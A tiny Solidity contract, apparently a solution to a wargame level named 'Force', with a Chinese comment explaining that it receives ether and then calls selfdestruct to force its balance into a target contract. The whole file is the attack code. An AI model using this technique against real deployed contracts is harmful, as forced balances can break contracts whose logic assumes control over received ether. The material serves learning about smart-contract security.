//创建一个自毁合约,存入eth后自毁,把余额发送到Force合约

contract Attack {
    
    receive() payable external{

    }
    function attack(address payable _target) public payable {
      selfdestruct(_target);
  }
}
